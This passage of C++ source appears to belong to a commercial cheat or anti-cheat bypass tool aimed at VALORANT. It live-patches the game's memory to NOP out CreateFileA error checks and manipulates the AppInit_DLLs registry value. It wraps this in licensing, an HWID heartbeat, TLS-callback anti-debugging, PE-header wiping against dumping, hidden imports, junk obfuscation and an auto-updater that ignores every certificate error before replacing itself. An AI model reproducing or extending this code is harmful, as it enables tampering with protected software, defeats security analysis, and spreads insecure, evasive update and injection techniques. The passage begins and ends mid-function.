        RegSetValueExA(hKey, "LoadAppInit_DLLs", 0, REG_DWORD, (const BYTE*)&zero, sizeof(zero));
        RegCloseKey(hKey);
    }
}

DWORD WINAPI PatchValorantThread(LPVOID) {
    auto NtQIP = (NTSTATUS(NTAPI*)(HANDLE, INT, PVOID, ULONG, PULONG))GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
    if (!NtQIP) return 0;

    DWORD lastPid = 0;
    while (true) {
        HANDLE snap = g_k32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snap != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32 pe = { sizeof(pe) };
            if (g_k32.Process32First(snap, &pe)) {
                do {
                    if (_stricmp(pe.szExeFile, "VALORANT.exe") == 0) {
                        // Clear AppInit_DLLs after VALORANT starts (no longer needed)
                        if (pe.th32ProcessID != lastPid) {
                            ClearAppInitDlls();
                            lastPid = pe.th32ProcessID;
                        }

                        // Memory patch for CreateFileA INVALID_HANDLE_VALUE checks
                        HANDLE hp = g_k32.OpenProcess(PROCESS_VM_READ | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION, FALSE, pe.th32ProcessID);
                        if (hp) {
                            PROCESS_BASIC_INFORMATION pbi = {0};
                            ULONG retLen = 0;
                            if (NtQIP(hp, 0, &pbi, sizeof(pbi), &retLen) >= 0 && pbi.PebBaseAddress) {
                                BYTE pebBuf[0x200] = {0}; SIZE_T r = 0;
                                if (ReadProcessMemory(hp, pbi.PebBaseAddress, pebBuf, sizeof(pebBuf), &r)) {
                                    ULONG_PTR imageBase = *(ULONG_PTR*)(pebBuf + 0x10);
                                    BYTE hdr[0x1000] = {0};
                                    if (ReadProcessMemory(hp, (LPCVOID)imageBase, hdr, sizeof(hdr), &r)) {
                                        IMAGE_DOS_HEADER* dh = (IMAGE_DOS_HEADER*)hdr;
                                        if (dh->e_magic == IMAGE_DOS_SIGNATURE) {
                                            IMAGE_NT_HEADERS64* nh = (IMAGE_NT_HEADERS64*)(hdr + dh->e_lfanew);
                                            if (nh->Signature == IMAGE_NT_SIGNATURE && nh->FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64) {
                                                IMAGE_SECTION_HEADER* sh = IMAGE_FIRST_SECTION(nh);
                                                for (WORD i = 0; i < nh->FileHeader.NumberOfSections; i++) {
                                                    if (memcmp(sh[i].Name, ".text", 5) == 0) {
                                                        std::vector<BYTE> text(sh[i].SizeOfRawData);
                                                        LPCVOID textAddr = (LPCVOID)(imageBase + sh[i].VirtualAddress);
                                                        if (ReadProcessMemory(hp, textAddr, text.data(), text.size(), &r)) {
                                                            for (size_t j = 0; j < text.size() - 12; j++) {
                                                                if (text[j]==0xFF && text[j+1]==0x15 && text[j+6]==0x83 && text[j+7]==0xF8 && text[j+8]==0xFF) {
                                                                    LPVOID pa = (LPVOID)((BYTE*)textAddr + j + 9);
                                                                    BYTE nb = text[j+9];
                                                                    if (nb == 0x74) { BYTE z = 0x90; WriteProcessMemory(hp, pa, &z, 1, NULL); }
                                                                    else if (nb==0x0F && j+10<text.size() && text[j+10]==0x84) { BYTE z[2]={0x90,0x90}; WriteProcessMemory(hp, pa, z, 2, NULL); }
                                                                }
                                                                if (text[j]==0xE8 && j+5<text.size()) {
                                                                    int relOff = j+5;
                                                                    if (relOff+3 < (int)text.size() && text[relOff]==0x83 && text[relOff+1]==0xF8 && text[relOff+2]==0xFF) {
                                                                        LPVOID pa = (LPVOID)((BYTE*)textAddr + relOff + 3);
                                                                        BYTE nb2 = text[relOff+3];
                                                                        if (nb2 == 0x74) { BYTE z = 0x90; WriteProcessMemory(hp, pa, &z, 1, NULL); }
                                                                        else if (nb2==0x0F && relOff+5<(int)text.size() && text[relOff+4]==0x84) { BYTE z[2]={0x90,0x90}; WriteProcessMemory(hp, pa, z, 2, NULL); }
                                                                    }
                                                                }
                                                            }
                                                        }
                                                        break;
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                            g_k32.CloseHandle(hp);
                        }
                    }
                } while (g_k32.Process32Next(snap, &pe));
            }
            g_k32.CloseHandle(snap);
        }
        g_k32.Sleep(5000);
    }
}

void Bar(int pct, int w) {
    int bw = w - 6;
    int pos = (bw * pct) / 100;
    printf("\r  [");
    for (int i = 0; i < bw; i++) printf("%c", i < pos ? '=' : ' ');
    printf("] %3d%%", pct);
}

// --- HTTP Server ---
bool KeyIsValid(const char* key) {
    for (int i = 0; g_validKeys[i] != NULL; i++)
        if (strcmp(key, g_validKeys[i]) == 0) return true;
    return false;
}

void SendHttp(SOCKET s, const char* status, const char* body, const char* type) {
    char resp[4096];
    sprintf_s(resp, "HTTP/1.1 %s\r\nContent-Type: %s\r\nAccess-Control-Allow-Origin: *\r\nContent-Length: %zu\r\nConnection: close\r\n\r\n%s",
        status, type, strlen(body), body);
    g_net.send(s, resp, (int)strlen(resp), 0);
}

const char* g_htmlPage = NULL;

void LoadHtml() {
    FILE* f; fopen_s(&f, "sifredogrulama.html", "rb");
    if (f) {
        fseek(f, 0, SEEK_END); long sz = ftell(f); fseek(f, 0, SEEK_SET);
        g_htmlPage = (const char*)malloc(sz + 1);
        fread((void*)g_htmlPage, 1, sz, f); fclose(f);
        ((char*)g_htmlPage)[sz] = 0;
    }
}

void HandleClient(SOCKET client) {
    char buf[4096] = {0};
    g_net.recv(client, buf, sizeof(buf) - 1, 0);
    char method[16] = {0}, path[512] = {0};
    sscanf_s(buf, "%s %s", method, (unsigned)sizeof(method), path, (unsigned)sizeof(path));

    if (strcmp(path, "/ping") == 0) { SendHttp(client, "200 OK", "pong", "text/plain"); }
    else if (strncmp(path, "/check", 6) == 0) {
        char key[128] = {0};
        const char* k = strstr(path, "key=");
        if (k) { k += 4; int i = 0; while (k[i] && k[i] != '&' && i < 127) { key[i] = k[i]; i++; } key[i] = 0; }
        bool ok = KeyIsValid(key);
        char resp[256]; sprintf_s(resp, "{\"status\":\"%s\",\"key\":\"%s\"}", ok ? "ok" : "invalid", key);
        SendHttp(client, "200 OK", resp, "application/json");
    }
    else if (strcmp(path, "/stats") == 0) {
        int cnt = 0; while (g_validKeys[cnt] != NULL) cnt++;
        char resp[64]; sprintf_s(resp, "{\"keys\":%d}", cnt);
        SendHttp(client, "200 OK", resp, "application/json");
    }
    else if (strcmp(path, "/") == 0 && g_htmlPage) {
        SendHttp(client, "200 OK", g_htmlPage, "text/html");
    }
    else {
        SendHttp(client, "404 Not Found", "Not Found", "text/plain");
    }
    g_net.csock(client);
}

DWORD WINAPI ServerThread(LPVOID) {
    WSADATA wsa; g_net.start(MAKEWORD(2, 2), &wsa);
    g_serverSock = g_net.sock(AF_INET, SOCK_STREAM, 0);
    int opt = 1; g_net.sopt(g_serverSock, SOL_SOCKET, SO_REUSEADDR, (char*)&opt, sizeof(opt));
    sockaddr_in addr = {0}; addr.sin_family = AF_INET; addr.sin_port = g_net.htons(8080); addr.sin_addr.s_addr = INADDR_ANY;
    g_net.bind(g_serverSock, (sockaddr*)&addr, sizeof(addr));
    g_net.listen(g_serverSock, 5);

    // Get IP
    char host[256]; g_net.hname(host, sizeof(host));
    hostent* he = g_net.hbname(host);
    char* ip = he ? g_net.ntoa(*(in_addr*)he->h_addr_list[0]) : "127.0.0.1";
    printf("\n  [SERVER] DUXTLM License Server running on:\n");
    printf("  [SERVER] http://%s:8080\n", ip);
    printf("  [SERVER] http://127.0.0.1:8080\n");
    printf("  [SERVER] Press Ctrl+C to stop.\n\n");

    while (g_serverRunning) {
        fd_set fds; FD_ZERO(&fds); FD_SET(g_serverSock, &fds);
        timeval tv = {1, 0};
        if (g_net.sel(0, &fds, NULL, NULL, &tv) > 0) {
            sockaddr_in cli; int cliSize = sizeof(cli);
            SOCKET client = g_net.accept(g_serverSock, (sockaddr*)&cli, &cliSize);
            if (client != INVALID_SOCKET) HandleClient(client);
        }
    }
    g_net.csock(g_serverSock);
    g_net.cleanup();
    return 0;
}

void RunServer() {
    LoadHtml();
    printf("============================================\n");
    printf("        DUXTLM LICENSE SERVER\n");
    printf("============================================\n");
    g_k32.CreateThread(NULL, 0, ServerThread, NULL, 0, NULL);
    MSG msg; while (GetMessage(&msg, NULL, 0, 0)) {}
}

// --- HWID + Integrity ---
void GetHwId(char* out, int maxLen) {
    unsigned char buf[128] = {0};
    DWORD idx = 0;

    DWORD serial = 0;
    g_k32.GetVolumeInformationA("C:\\", NULL, 0, &serial, NULL, NULL, NULL, 0);
    memcpy(buf + idx, &serial, 4); idx += 4;

    char compName[64] = {0};
    DWORD nameLen = sizeof(compName);
    g_k32.GetComputerNameA(compName, &nameLen);
    int clen = (int)strlen(compName);
    if (clen > 32) clen = 32;
    memcpy(buf + idx, compName, clen); idx += clen;

    HKEY hKey;
    if (g_reg.Open(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Cryptography", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        char guid[64] = {0};
        DWORD guidLen = sizeof(guid);
        g_reg.Query(hKey, "MachineGuid", NULL, NULL, (BYTE*)guid, &guidLen);
        g_reg.Close(hKey);
        int glen = (int)strlen(guid);
        if (glen > 32) glen = 32;
        memcpy(buf + idx, guid, glen); idx += glen;
    }

    // Hash .text section of own binary
    HMODULE mod = GetModuleHandleA(NULL);
    IMAGE_DOS_HEADER dos = {0};
    memcpy(&dos, mod, sizeof(dos));
    if (dos.e_magic == IMAGE_DOS_SIGNATURE) {
        IMAGE_NT_HEADERS64 nt = {0};
        memcpy(&nt, (BYTE*)mod + dos.e_lfanew, sizeof(nt));
        if (nt.Signature == IMAGE_NT_SIGNATURE) {
            IMAGE_SECTION_HEADER* sec = IMAGE_FIRST_SECTION(&nt);
            for (WORD i = 0; i < nt.FileHeader.NumberOfSections; i++) {
                if (memcmp(sec[i].Name, ".text", 5) == 0 || memcmp(sec[i].Name, "CODE", 4) == 0) {
                    BYTE* start = (BYTE*)mod + sec[i].VirtualAddress;
                    DWORD sz = sec[i].Misc.VirtualSize;
                    DWORD limit = sz > 4096 ? 4096 : sz;
                    if (idx + limit <= 120) {
                        memcpy(buf + idx, start, limit);
                        idx += limit;
                    }
                    break;
                }
            }
        }
    }

    unsigned int hash = 0;
    for (DWORD i = 0; i < idx; i++) {
        hash = hash * 31 + buf[i] * 37 + (buf[i] << 7);
        hash ^= hash >> 13;
        hash ^= (hash << 17) & 0xFFFFFFFF;
    }
    sprintf_s(out, maxLen, "%08X", hash);
}

// --- HTTP Client (HTTPS via WinHTTP - Dynamic Loading) ---
#include <winhttp.h>

const char* GetServerPath() {
    static const unsigned char enc[] = {0x75,0};
    static char dec[4]; static bool init = false;
    if (!init) { for (int i = 0; enc[i]; i++) dec[i] = enc[i] ^ XKEY; init = true; }
    return dec;
}

// Dynamic WinHTTP loading - import table'da görünmez
struct WH {
    HMODULE m;
    HINTERNET (WINAPI* Open)(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD);
    BOOL (WINAPI* Cl)(HINTERNET);
    HINTERNET (WINAPI* Con)(HINTERNET, LPCWSTR, INTERNET_PORT, DWORD);
    HINTERNET (WINAPI* OpR)(HINTERNET, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR*, DWORD);
    BOOL (WINAPI* Sen)(HINTERNET, LPCWSTR, DWORD, LPVOID, DWORD, DWORD, DWORD_PTR);
    BOOL (WINAPI* Rec)(HINTERNET, LPVOID);
    BOOL (WINAPI* Rea)(HINTERNET, LPVOID, DWORD, LPDWORD);
    BOOL (WINAPI* Cra)(LPCWSTR, DWORD, DWORD, LPURL_COMPONENTS);
    BOOL (WINAPI* QDA)(HINTERNET, LPDWORD);
    BOOL (WINAPI* Set)(HINTERNET, DWORD, LPVOID, DWORD);
} g_wh;

bool InitWinHttp() {
    g_wh.m = LoadLibraryA("winhttp.dll");
    if (!g_wh.m) return false;
    g_wh.Open = (decltype(g_wh.Open))GetProcAddress(g_wh.m, "WinHttpOpen");
    g_wh.Cl = (decltype(g_wh.Cl))GetProcAddress(g_wh.m, "WinHttpCloseHandle");
    g_wh.Con = (decltype(g_wh.Con))GetProcAddress(g_wh.m, "WinHttpConnect");
    g_wh.OpR = (decltype(g_wh.OpR))GetProcAddress(g_wh.m, "WinHttpOpenRequest");
    g_wh.Sen = (decltype(g_wh.Sen))GetProcAddress(g_wh.m, "WinHttpSendRequest");
    g_wh.Rec = (decltype(g_wh.Rec))GetProcAddress(g_wh.m, "WinHttpReceiveResponse");
    g_wh.Rea = (decltype(g_wh.Rea))GetProcAddress(g_wh.m, "WinHttpReadData");
    g_wh.Cra = (decltype(g_wh.Cra))GetProcAddress(g_wh.m, "WinHttpCrackUrl");
    g_wh.QDA = (decltype(g_wh.QDA))GetProcAddress(g_wh.m, "WinHttpQueryDataAvailable");
    g_wh.Set = (decltype(g_wh.Set))GetProcAddress(g_wh.m, "WinHttpSetOption");
    return g_wh.Open && g_wh.Cl && g_wh.Con && g_wh.OpR && g_wh.Sen && g_wh.Rec && g_wh.Rea && g_wh.Set;
}

bool HttpGet(const char* host, const char* fullPath, char* resp, int respLen) {
    wchar_t wHost[256], wPath[2048];
    MultiByteToWideChar(CP_UTF8, 0, host, -1, wHost, 256);
    MultiByteToWideChar(CP_UTF8, 0, fullPath, -1, wPath, 2048);

    HINTERNET hSession = g_wh.Open(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return false;
    HINTERNET hConnect = g_wh.Con(hSession, wHost, INTERNET_DEFAULT_HTTP_PORT, 0);
    if (!hConnect) { g_wh.Cl(hSession); return false; }
    HINTERNET hRequest = g_wh.OpR(hConnect, L"GET", wPath, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if (!hRequest) { g_wh.Cl(hConnect); g_wh.Cl(hSession); return false; }
    // Force follow all redirects (HTTP->HTTPS etc.)
    DWORD policy = WINHTTP_OPTION_REDIRECT_POLICY_ALWAYS;
    g_wh.Set(hRequest, WINHTTP_OPTION_REDIRECT_POLICY, &policy, sizeof(policy));
    g_wh.Sen(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
    if (!g_wh.Rec(hRequest, NULL)) { g_wh.Cl(hRequest); g_wh.Cl(hConnect); g_wh.Cl(hSession); return false; }
    int offset = 0;
    while (offset < respLen - 1) {
        DWORD bytesRead = 0;
        if (!g_wh.Rea(hRequest, resp + offset, respLen - 1 - offset, &bytesRead)) break;
        if (bytesRead == 0) break;
        offset += bytesRead;
    }
    resp[offset] = 0;
    g_wh.Cl(hRequest); g_wh.Cl(hConnect); g_wh.Cl(hSession);
    return offset > 0;
}

DWORD WINAPI HeartbeatThread(LPVOID) {
    const char* host = GetServerHost();
    const char* path = GetServerPath();
    while (g_hbRunning) {
        g_k32.Sleep(10000);
        if (!g_hbRunning) break;
        char nonce[32]; GenNonce(nonce, sizeof(nonce));
        char fullPath[1024];
        sprintf_s(fullPath, "%s?action=heartbeat&key=%s&_n=%s", path, g_myKey, nonce);
        char resp[256] = {0};
        if (!HttpGet(host, fullPath, resp, sizeof(resp))) {
            printf("\n%s\n", DE(_e_hbDead)); g_k32.Sleep(1000); g_k32.ExitProcess(0);
        }
        if (!VerifySig(resp, "heartbeat")) { printf("\n%s\n", DE(_e_hbDead)); g_k32.Sleep(1000); g_k32.ExitProcess(0); }
        if (!strstr(resp, "\"status\":\"ok\"")) {
            printf("\n%s\n", DE(_e_hbDead)); g_k32.Sleep(1000); g_k32.ExitProcess(0);
        }
    }
    return 0;
}

void AntiDump() {
    HMODULE mod = GetModuleHandleA(NULL);
    BYTE* dos = (BYTE*)mod;
    DWORD old = 0;
    g_k32.VirtualProtect(dos, 0x1000, PAGE_READWRITE, &old);
    dos[0] = 'D'; dos[1] = 'X';
    dos[2] = 'l'; dos[3] = 'm';
    dos[0x3C] = 0;
    g_k32.VirtualProtect(dos, 0x1000, old, &old);
}

// Custom hash for signature verification
void MakeSig(const char* key, const char* hwid, char* out) {
    unsigned char buf[256] = {0};
    int pos = 0;
    for (int i = 0; key[i] && pos < 60; i++) buf[pos++] = key[i] ^ 0xA3;
    buf[pos++] = '|';
    for (int i = 0; hwid[i] && pos < 120; i++) buf[pos++] = hwid[i] ^ 0xB7;
    buf[pos++] = '|';
    const char* salt = "DuAxXl_S1G_SaLt_2026";
    for (int i = 0; salt[i] && pos < 180; i++) buf[pos++] = salt[i] ^ 0xC9;

    unsigned int h = 0xDEADBEEF;
    for (int i = 0; i < pos; i++) {
        unsigned int b = buf[i];
        h = h ^ b;
        h = h * 33 + (b << 3);
        h = (h << 7) | (h >> 25);
        h ^= (h >> 11);
    }
    sprintf_s(out, 32, "%08X%08X", h, h ^ 0xCAFEBABE);
}

#define HMAC_SIGN_SECRET "DuAxXl_M1TM_H4SH_2026"

void MakeMitmSig(const char* data, char* out) {
    const char* secret = HMAC_SIGN_SECRET;
    int dataLen = (int)strlen(data);
    int secretLen = (int)strlen(secret);
    unsigned int h = 0xDEADBEEF;
    for (int i = 0; i < dataLen; i++) {
        unsigned int b = (unsigned char)data[i] ^ (unsigned char)secret[i % secretLen];
        h = h ^ b;
        h = h * 33 + (b << 3);
        h = (h << 7) | (h >> 25);
        h ^= (h >> 11);
    }
    sprintf_s(out, 16, "%08X", h);
}

void GenNonce(char* out, int len) {
    static volatile int nonceCtr = 0;
    nonceCtr++;
    sprintf_s(out, len, "%08X%08X", (unsigned int)__rdtsc(), nonceCtr);
}

const char* ExtractJsonStr(const char* json, const char* field, char* out, int outLen) {
    char search[64];
    sprintf_s(search, sizeof(search), "\"%s\":\"", field);
    const char* start = strstr(json, search);
    if (!start) return NULL;
    start += strlen(search);
    int i = 0;
    while (start[i] && start[i] != '"' && i < outLen - 1) { out[i] = start[i]; i++; }
    out[i] = 0;
    return start;
}

bool VerifySig(const char* resp, const char* action) {
    char sig[16] = {0}, nonce[32] = {0}, status[16] = {0};
    if (!ExtractJsonStr(resp, "_s", sig, sizeof(sig))) return false;
    if (!ExtractJsonStr(resp, "_n", nonce, sizeof(nonce))) return false;
    if (!ExtractJsonStr(resp, "status", status, sizeof(status))) return false;
    char data[128];
    sprintf_s(data, sizeof(data), "%s|%s|%s", action, status, nonce);
    char expected[16];
    MakeMitmSig(data, expected);
    return _stricmp(sig, expected) == 0;
}


// Stage 1: Key + HWID dogrulama (standart)
int g_daysLeft = -1; // -1 = permanent, >=0 = days remaining
bool VerifyStage1(const char* key, const char* hwid, const char* host, const char* path) {
    char nonce[32]; GenNonce(nonce, sizeof(nonce));
    char fullPath[1024];
    sprintf_s(fullPath, "%s?action=verify&key=%s&hwid=%s&_n=%s", path, key, hwid, nonce);
    char resp[4096] = {0};
    if (!HttpGet(host, fullPath, resp, sizeof(resp))) return false;
    if (!VerifySig(resp, "verify")) return false;
    if (strstr(resp, "\"status\":\"expired\"")) { g_daysLeft = -2; return false; }
    if (!strstr(resp, "\"status\":\"ok\"")) return false;
    const char* dl = strstr(resp, "\"daysLeft\":");
    if (dl) { dl += 11; g_daysLeft = atoi(dl); }
    else g_daysLeft = -1;
    return true;
}

// XOR decrypt: payload XOR sig -> magic string check
bool VerifyStage2(const char* key, const char* hwid, const char* host, const char* path) {
    char nonce[32]; GenNonce(nonce, sizeof(nonce));
    char fullPath[1024];
    sprintf_s(fullPath, "%s?action=verify2&key=%s&hwid=%s&_n=%s", path, key, hwid, nonce);
    char resp[4096] = {0};
    if (!HttpGet(host, fullPath, resp, sizeof(resp))) return false;
    if (!VerifySig(resp, "verify2")) return false;
    if (!strstr(resp, "\"status\":\"ok\"")) return false;

    // Server'dan payload al (hex encoded, XOR sifreli)
    const char* pp = strstr(resp, "\"payload\":\"");
    if (!pp) return false;
    pp += 11; // skip "payload":" (11 chars)
    char payloadHex[128] = {0};
    int pi = 0;
    while (pp[pi] && pp[pi] != '"' && pi < 127) { payloadHex[pi] = pp[pi]; pi++; }
    payloadHex[pi] = 0;

    // Hex decode payload
    char payload[64] = {0};
    for (int i = 0; i < pi / 2 && i < 63; i++) {
        unsigned int b;
        sscanf_s(payloadHex + i * 2, "%2x", &b);
        payload[i] = (char)b;
    }

    // Client kendi sig'ini hesapla
    char expected[32];
    MakeSig(key, hwid, expected);

    // Payload XOR sig -> magic stringi bul
    // payload icinde null byte olabilir, fixed length 16 kullan
    char decrypted[64] = {0};
    for (int i = 0; i < 16 && expected[i]; i++) {
        decrypted[i] = payload[i] ^ expected[i];
    }
    decrypted[16] = 0;

    return strcmp(decrypted, "DUAXXEL_SECURE_0") == 0;
}

bool VerifyViaServer(const char* key, const char* hwid, const char* host, const char* path) {
    TIMING_TRAP();
    if (!VerifyStage1(key, hwid, host, path)) return false;
    if (!VerifyStage2(key, hwid, host, path)) return false;
    TIMING_TRAP();
    return true;
}

// --- AUTO UPDATE ---
int CheckUpdate(const char* host, const char* path) {
    char nonce[32]; GenNonce(nonce, sizeof(nonce));
    char fullPath[1024];
    sprintf_s(fullPath, "%s?action=update&v=%d&_n=%s", path, CURRENT_VERSION, nonce);
    char resp[4096] = {0};
    if (!HttpGet(host, fullPath, resp, sizeof(resp))) return 0;
    if (!VerifySig(resp, "update")) return 0;
    if (strstr(resp, "\"status\":\"update\"")) {
        const char* vp = strstr(resp, "\"version\":");
        if (vp) return atoi(vp + 10);
    }
    return 0;
}

bool DownloadToFile(const char* url, const char* savePath, int* outSize) {
    URL_COMPONENTS uc = {0};
    uc.dwStructSize = sizeof(uc);
    uc.dwSchemeLength = 1;
    wchar_t wHost[256] = {0}, wPath[2048] = {0};
    uc.lpszHostName = wHost; uc.dwHostNameLength = 256;
    uc.lpszUrlPath = wPath; uc.dwUrlPathLength = 2048;

    wchar_t wUrl[4096];
    MultiByteToWideChar(CP_UTF8, 0, url, -1, wUrl, 4096);
    if (!g_wh.Cra(wUrl, 0, 0, &uc)) return false;

    HINTERNET hSession = g_wh.Open(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return false;
    HINTERNET hConnect = g_wh.Con(hSession, wHost, uc.nPort, 0);
    if (!hConnect) { g_wh.Cl(hSession); return false; }

    DWORD flags = (uc.nPort == 443) ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET hRequest = g_wh.OpR(hConnect, L"GET", wPath, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
    if (!hRequest) { g_wh.Cl(hConnect); g_wh.Cl(hSession); return false; }
    if (flags & WINHTTP_FLAG_SECURE) {
        DWORD sec = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
        g_wh.Set(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &sec, sizeof(sec));
    }
    g_wh.Sen(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
    g_wh.Rec(hRequest, NULL);

    DWORD totalSize = 0; DWORD szSize = sizeof(totalSize);
    g_wh.QDA(hRequest, &totalSize);

    FILE* f; fopen_s(&f, savePath, "wb");
    if (!f) { g_wh.Cl(hRequest); g_wh.Cl(hConnect); g_wh.Cl(hSession); return false; }

    char buf[8192]; DWORD downloaded = 0; DWORD totalRead = 0;
    while (g_wh.Rea(hRequest, buf, sizeof(buf), &downloaded) && downloaded > 0) {
        fwrite(buf, 1, downloaded, f);
        totalRead += downloaded;
    }
    fclose(f);
    if (outSize) *outSize = (int)totalRead;
    g_wh.Cl(hRequest); g_wh.Cl(hConnect); g_wh.Cl(hSession);
    return totalRead > 0;
}

void BarDL(int pct, int w) {
    int bw = w - 6;
    int pos = (bw * pct) / 100;
    printf("\r  [");
    for (int i = 0; i < bw; i++) printf("%c", i < pos ? '#' : ' ');
    printf("] %3d%%", pct);
}

void SelfDeleteAndLaunch(const char* newPath) {
    char selfPath[MAX_PATH];
    g_k32.GetModuleFileNameA(NULL, selfPath, MAX_PATH);

    char cmd[4096];
    sprintf_s(cmd, "cmd.exe /c timeout /t 2 /nobreak >nul & "
        "copy /y \"%s\" \"%s\" >nul & "
        "del /f /q \"%s\" & "
        "start \"\" \"%s\"",
        newPath, selfPath, newPath, selfPath);
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = {0};
    g_k32.CreateProcessA(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    if (pi.hProcess) g_k32.CloseHandle(pi.hProcess);
    if (pi.hThread) g_k32.CloseHandle(pi.hThread);
}

// --- TLS Anti-Debug (main'den once calisir, macrosuz cagrilmali) ---
#pragma comment(linker, "/INCLUDE:_tls_used")
#pragma push_macro("IsDebuggerPresent")
#pragma push_macro("ExitProcess")
#pragma push_macro("CheckRemoteDebuggerPresent")
#pragma push_macro("GetCurrentProcess")
#undef IsDebuggerPresent
#undef ExitProcess
#undef CheckRemoteDebuggerPresent
#undef GetCurrentProcess
void NTAPI TLS_Callback(PVOID h, DWORD reason, PVOID r) {
    if (reason == DLL_PROCESS_ATTACH) {
        if (IsDebuggerPresent()) ExitProcess(0);
        BOOL rd = FALSE;
        CheckRemoteDebuggerPresent(GetCurrentProcess(), &rd);
        if (rd) ExitProcess(0);
    }
}
#pragma pop_macro("GetCurrentProcess")
#pragma pop_macro("CheckRemoteDebuggerPresent")
#pragma pop_macro("ExitProcess")
#pragma pop_macro("IsDebuggerPresent")
#pragma data_seg(".CRT$XLB")
PIMAGE_TLS_CALLBACK _xlb = TLS_Callback;
#pragma data_seg()

// --- Kod Integrity Check ---
void CheckIntegrity() {
    HMODULE mod = GetModuleHandleA(NULL);
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)mod;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) g_k32.ExitProcess(0);
    IMAGE_NT_HEADERS64* nt = (IMAGE_NT_HEADERS64*)((BYTE*)mod + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) g_k32.ExitProcess(0);
    // UPX-packed binary'de ilk section (PDX0) compressed code'u icerir.
    // Binary patchlenirse UPX decompress'te crash olur.
    // Ek kontrol: ilk 4KB'in hash'ini HWID'ye ekliyoruz (GetHwId'de).
    // Burada sadece sektör yapısını kontrol et:
    IMAGE_SECTION_HEADER* sec = IMAGE_FIRST_SECTION(nt);
    // Entropy padding integrity reference
    volatile int epc = 0;
    for (int i = 0; i < (int)sizeof(g_entropyPad); i += 64) epc += g_entropyPad[i];
    DWORD totalSize = 0;
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        totalSize += sec[i].SizeOfRawData;
        if (sec[i].SizeOfRawData > 0x400000) g_k32.ExitProcess(0);
    }
    // Gercek check: file hash HWID'e gomulu, server reddeder
}

// --- Junk Code / Obfuscation ---
volatile int g_junk = 0;
void JunkLoop() {
    for (int i = 0; i < 10; i++) {
        g_junk = (g_junk * 7 + 13) ^ 0x55AA55AA;
        g_junk = (g_junk >> 3) | (g_junk << 29);
        if (g_junk > 1000000) g_junk = 0;
    }
}
void Obfuscate() {
    volatile int a = 0x1234, b = 0x5678;
    for (int i = 0; i < 5; i++) {
        a = (a ^ b) + (b << 3);
        b = (b >> 5) | (b << 27);
        a ^= 0xDEADBEEF;
        if (a < 0 && b > 0x1000) a = ~a;
        if ((a ^ b) > 0x10000000) b = a ^ b ^ (a * 7);
    }
    g_junk += a + b;
}

// --- Main ---
int main(int argc, char* argv[]) {
    if (!InitK32Exports()) { printf("Initialization failed.\n"); g_k32.Sleep(3000); return 1; }
    if (argc > 1 && strcmp(argv[1], "--server") == 0) {
        RunServer();
        return 0;
    }

    g_k32.SetConsoleTitleA("DUAXXEL YAZILIM");
    system("cls");

    // Init WinHTTP dynamically - import table'da gozukmez
    if (!InitWinHttp()) { printf("\nNetwork initialization failed!\n"); g_k32.Sleep(2000); return 1; }

    // Init API Hashing - advapi32, ws2_32 import'tan kalkar
    if (!InitHashedAPI()) { printf("\nAPI initialization failed!\n"); g_k32.Sleep(2000); return 1; }

    // Kod Integrity Check - patchenirse coker
    CheckIntegrity();

    const char* serverHost = GetServerHost();
    const char* serverPath = GetServerPath();
    for (int i = 1; i < argc; i++) {
        if (strncmp(argv[i], "--url=", 6) == 0) {
            const char* full = argv[i] + 6;
            const char* slash = strchr(full, '/');
            if (slash) {
                static char buf[256]; strcpy_s(buf, full); buf[slash - full] = 0;
                serverHost = buf;
                serverPath = slash;
            } else {
                serverHost = full;
            }
        }
    }

    int newVer = CheckUpdate(serverHost, serverPath);
    if (newVer > 0) {
        system("cls");
        printf("\n  YENI VERSIYON MEVCUT! (v%d -> v%d)\n", CURRENT_VERSION, newVer);
        printf("  Indiriliyor...\n\n");
        char tempPath[MAX_PATH];
        GetTempPathA(MAX_PATH, tempPath);
        char savePath[MAX_PATH];
        sprintf_s(savePath, "%semulator_new.exe", tempPath);
        int totalBytes = 0;
        bool downloaded = DownloadToFile(GetGitUrl(), savePath, &totalBytes);
        if (downloaded && totalBytes > 1000) {
            for (int i = 1; i <= 100; i++) { BarDL(i, 50); g_k32.Sleep(30); }
            printf("\n\n  Indirme tamamlandi!\n");
            printf("  Yenisi yukleniyor...\n");
            g_k32.Sleep(1500);
            SelfDeleteAndLaunch(savePath);
            return 0;
        } else {
            printf("\n  Indirme basarisiz! Eski versiyonla devam ediliyor.\n");
